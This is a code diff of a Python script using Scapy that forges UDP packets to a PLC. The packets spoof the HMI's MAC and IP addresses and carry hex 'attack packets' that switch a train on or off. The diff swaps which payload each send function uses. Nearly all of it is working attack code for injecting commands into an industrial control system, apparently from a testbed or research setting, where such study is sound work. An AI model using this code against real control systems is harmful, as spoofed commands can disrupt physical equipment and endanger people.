@@ -36,18 +36,12 @@ MITZ_LINK = Struct(
 #                   "57 | 01 00 00 01 | 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00"      #?
 
 
-attack_packet_on="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 "
-attack_packet_off="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"
-#attack_packet_on="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 "
- 
-# 74:86:e2:12:f1:6b
-# 2
-# 00:13:ef:30:07:d9
-#
+attack_packet_off="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 "
+attack_packet_on="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"
+
 
 def Send_TRAIN_OFF():
-    data_off = bytes.fromhex(attack_packet_on)
-    #udpf = Ether(src=PLC_MAC, dst=PLC_MAC) / IP(dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
+    data_off = bytes.fromhex(attack_packet_off)
     udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
     for _ in range(10):
         sendp(udpf)
@@ -57,7 +51,7 @@ def Send_TRAIN_OFF():
     # time.sleep(1)
 
 def Send_TRAIN_ON():
-    data_on = bytes.fromhex(attack_packet_off)
+    data_on = bytes.fromhex(attack_packet_on)
     udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_on)
     for _ in range(10):
         sendp(udpf)
